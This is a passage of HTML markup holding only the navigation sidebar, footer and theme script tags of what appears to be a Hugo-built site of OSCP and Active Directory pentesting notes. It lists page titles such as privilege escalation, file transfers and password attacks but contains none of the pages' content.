class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/eum4linux/index.html><a class=padding href=../../oscp-notes/eum4linux/index.html>eum4linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rpcclient/index.html><a class=padding href=../../oscp-notes/rpcclient/index.html>rpcclient<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/spwaning-shell/index.html><a class=padding href=../../oscp-notes/spwaning-shell/index.html>spwaning shell<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-windows/index.html><a class=padding href=../../oscp-notes/file-transfers-windows/index.html>File transfers windows<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html><a class=padding href=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html>file transfer using nc_ncat and rdp_winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/living-off-the-land-file-transfer/index.html><a class=padding href=../../oscp-notes/living-off-the-land-file-transfer/index.html>living off the land file transfer<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/transferring-files-with-code/index.html><a class=padding href=../../oscp-notes/transferring-files-with-code/index.html>Transferring Files with Code<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/privilige-escalation/index.html><a class=padding href=../../oscp-notes/privilige-escalation/index.html>privilige escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=active data-nav-url=../../oscp-notes/linux-privilege-escalation/index.html><a class=padding href=../../oscp-notes/linux-privilege-escalation/index.html>linux privilege escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/windows-privilege-escalation/index.html><a class=padding href=../../oscp-notes/windows-privilege-escalation/index.html>Windows Privilege Escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/pivoting_tunneling/index.html><a class=padding href=../../oscp-notes/pivoting_tunneling/index.html>Scanning the Pivot Target<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-active-directory/index.html><a class=padding href=../../oscp-notes/the-active-directory/index.html>The Active Directory<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-metasploit-framework/index.html><a class=padding href=../../oscp-notes/the-metasploit-framework/index.html>The Metasploit Framework<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-remote-management/index.html><a class=padding href=../../oscp-notes/linux-remote-management/index.html>Linux Remote Management<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rdp-and-windows-remote-management/index.html><a class=padding href=../../oscp-notes/rdp-and-windows-remote-management/index.html>RDP and winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-linux/index.html><a class=padding href=../../oscp-notes/file-transfers-linux/index.html>File transfers Linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/password-attacks/index.html><a class=padding href=../../oscp-notes/password-attacks/index.html>password attacks<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li><li data-nav-url=../../ad-pentesting/index.html><input type=checkbox id=R-section-acf7f22c45d9303a8bb9a8ae3a7b966c aria-controls=R-subsections-acf7f22c45d9303a8bb9a8ae3a7b966c><label for=R-section-acf7f22c45d9303a8bb9a8ae3a7b966c><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu AD Pentesting</span></label><a class=padding href=../../ad-pentesting/index.html>AD Pentesting<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-acf7f22c45d9303a8bb9a8ae3a7b966c class=collapsible-menu><li data-nav-url=../../ad-pentesting/windows-pre-2000-abuse/index.html><a class=padding href=../../ad-pentesting/windows-pre-2000-abuse/index.html>Windows Pre 2000 Abuse<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../ad-pentesting/setting-up-adcs-and-pkint/index.html><a class=padding href=../../ad-pentesting/setting-up-adcs-and-pkint/index.html>ADCS<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul><li class=R-historyclearer><div class="padding menu-control"><i class="fa-fw fas fa-history"></i>
<span>&nbsp;</span><div class=control-style><button>Clear History</button></div><div class=clear></div></div></li></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=../../js/js-yaml/js-yaml.min.js?1762394475 defer></script><script src=../../js/d3/d3-color.min.js?1762394475 defer></script><script src=../../js/d3/d3-dispatch.min.js?1762394475 defer></script><script src=../../js/d3/d3-drag.min.js?1762394475 defer></script><script src=../../js/d3/d3-ease.min.js?1762394475 defer></script><script src=../../js/d3/d3-interpolate.min.js?1762394475 defer></script><script src=../../js/d3/d3-selection.min.js?1762394475 defer></script><script src=../../js/d3/d3-timer.min.js?1762394475 defer></script><script src=../../js/d3/d3-transition.min.js?1762394475 defer></script><script src=../../js/d3/d3-zoom.min.js?1762394475 defer></script><script src=../../js/mermaid/mermaid.min.js?1762394475 defer></script><script>window.relearn.themeUseMermaid=JSON.parse("{}")</script><script src=../../js/clipboard/clipboard.min.js?1762394475 defer></script><script src=../../js/perfect-scrollbar/perfect-scrollbar.min.js?1762394475 defer></script><script src=../../js/theme.min.js?1762394475 defer></script></body></html>